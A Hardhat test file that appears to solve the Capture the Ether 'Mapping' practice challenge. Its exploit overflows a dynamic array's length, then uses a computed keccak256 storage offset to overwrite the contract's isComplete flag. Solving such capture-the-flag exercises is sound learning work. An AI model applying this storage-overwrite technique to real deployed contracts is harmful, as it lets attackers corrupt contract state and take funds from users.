import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, BigNumber } = ethers;

describe('MappingChallenge', () => {
  let target: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    await network.provider.request({
      method: 'hardhat_reset',
      params: [],
    });

    [owner, attacker] = await ethers.getSigners();

    const targetFactory = await ethers.getContractFactory('MappingChallenge');
    target = await targetFactory.deploy();
    await target.deployed();

    console.log('Target deployed to:', target.address);
  });

  it('Exploit', async () => {
    let tx;

    console.log('1 - Adding padding');
    // extending array out of limits
    tx = await target.set(BigNumber.from(`2`).pow(`256`).sub(`2`), 2);
    await tx.wait();

    // map[0] value is stored at keccak(p) = keccak(1)
    // needs to be padded to a 256 bit
    const mapZeroDirection = `0x0000000000000000000000000000000000000000000000000000000000000001`;
    const mapDataBegin = BigNumber.from(utils.keccak256(mapZeroDirection));

    const isCompleteOffset = BigNumber.from(`2`).pow(`256`).sub(mapDataBegin);

    console.log('2 - Overriding isComplete');
    tx = await target.set(isCompleteOffset, `1`);
    await tx.wait();
  });

  after(async () => {
    expect(await target.isComplete()).to.equal(true);
  });
});
